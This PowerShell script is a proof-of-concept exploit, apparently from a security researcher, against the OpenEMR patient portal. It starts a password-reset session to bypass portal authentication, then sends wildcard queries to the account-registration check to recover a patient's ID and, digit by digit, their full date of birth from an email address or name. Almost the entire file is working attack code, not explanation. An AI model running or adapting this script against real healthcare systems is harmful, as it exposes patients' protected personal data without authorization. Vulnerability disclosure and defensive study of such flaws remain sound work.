#################################################################################################################
#  Author: Chris Patterson                                                                                      #
#  Date: 2022-01-01                                                                                             #
#  Purpose: Identify vulnerability in OpenEMR patient portal where self registration allows comparison          #
#           of account to existing accounts.  This can be used to obtain the birthday of a patient with         #
#           their email address or the first, middle, last name combination.                                    #
#  CVE ID:                                                                                                      #
#                                                                                                               #
#################################################################################################################
#Set proxy if needed (Fiddler users http://localhost:8888)
$proxy = $null #"http://localhost:8888"
$requestCount = 0
$id = $null
$startTime = Get-Date

#Get the server fqdn
if (!$fqdn) {
    $fqdn = Read-Host "Enter the fqdn of the OpenEMR Instance (https://demo.openemr.io/openemr)"
}

while (!$id) {
    #Get match attribute information
    if ((Read-Host -Prompt "Lookup by Email? (y|n)").ToLower() -eq "y")
    {
        #Get the patient's email address
        $email = Read-Host -Prompt "Enter the email address (SQL LIKE syntax allowed for partial matches)"
        $first = ""
        $last = ""
    } else {
        #Get the patient's first name
        $first = Read-Host -Prompt "Enter the First Name (SQL LIKE syntax allowed for partial matches)"

        #Get the patient's last name
        $last = Read-Host -Prompt "Enter the Last Name (SQL Like syntax allowed for partial matches)"

        $email = ""
    }

    #Start a session by requesting a password reset without logging in
    #This activates the error handling logic in index.php which sets $_SESSION['register']=true
    #when register session variable is true, authentication is bypassed for the patient portal API
    $null = Invoke-WebRequest -URI "$fqdn/portal/index.php?requestNew=true" -SessionVariable 'session' -Proxy $proxy
    #Alternatively, if the self registration function is enabled, we can start that session to achieve
    #the same result of a register session variable set to true.
    #$null = Invoke-WebRequest -URI "$fqdn/portal/account/register.php" -SessionVariable 'session'

    $patURI = "$fqdn/portal/account/account.php?action=get_newpid&value=&last=$($last)&first=$($first)&email=$($email)&dob="
    $dob = ""

    #Now that we have a registration session, 
    $response = Invoke-WebRequest -URI ($patURI + "%") -WebSession $session
    $requestCount++

    #Evaluate the response, to see if a match exists
    if ($response.Content -like "This account already exists*") {    
        $id = $response.Content.Substring($response.Content.Length - ($response.Content.Length - $response.Content.LastIndexOf(" ") - 1))
        $requestCount++
        Write-Host "Patient account exists with an id of $id, proceeding to find the birthday."
    } else {
        Write-Host "Match not found, starting over."
    }
}

#Find the Centry Value of the Date of Birth
foreach ($century in (18..[int]((Get-Date).Year/100))) {
    Write-Host -NoNewline "`rPatient's Birthday is $century"
    $dobFormat = "$century%"
    $response = Invoke-WebRequest -URI ($patURI + $dobFormat) -WebSession $session
    $requestCount++
    if ($response.Content -like "This account already exists*") {
        $dob = [string]$century
        break
    }
}

#Find the Decade Value of the Date of Birth
foreach ($decade in (0..9)) {
    Write-Host -NoNewline "`rPatient's Birthday is $($dob)$($decade)"
    $dobFormat = "$dob$decade%"
    $response = Invoke-WebRequest -URI ($patURI + $dobFormat) -WebSession $session
    $requestCount++
    if ($response.Content -like "This account already exists*") {
        $dob += [string]$decade
        break
    }
}

#Find the Year Value of the Date of Birth
foreach ($year in (0..9)) {
    Write-Host -NoNewline "`rPatient's Birthday is $dob$year"
    $dobFormat = "$dob$year%"
    $response = Invoke-WebRequest -URI ($patURI + $dobFormat) -WebSession $session
    $requestCount++
    if ($response.Content -like "This account already exists*") {
        $dob += [string]$year
        break
    }
}

#Find the Month Value of the Date of Birth
foreach ($month in (1..12)) {
    Write-Host -NoNewline "`rPatient's Birthday is $dob-$(([string]$month).PadLeft(2,"0"))"
    $dobFormat = "$dob-$(([string]$month).PadLeft(2,"0"))%"
    $response = Invoke-WebRequest -URI ($patURI + $dobFormat) -WebSession $session
    $requestCount++
    if ($response.Content -like "This account already exists*") {
        $dob += "-$(([string]$month).PadLeft(2,"0"))"
        break
    }
}

#Find the Day Value of the Date of Birth
foreach ($day in (1..31)) {
    Write-Host -NoNewline "`rPatient's Birthday is $dob-$(([string]$day).PadLeft(2,"0"))"
    $dobFormat = "$dob-$(([string]$day).PadLeft(2,"0"))"
    $response = Invoke-WebRequest -URI ($patURI + $dobFormat) -WebSession $session
    $requestCount++
    if ($response.Content -like "This account already exists*") {
        $dob += "-$(([string]$day).PadLeft(2,"0"))"
        break
    }
}

Write-Host ""
Write-Host "Time Elapsed $(((Get-Date)-$startTime)), $requestCount requests were made."
Write-Host ""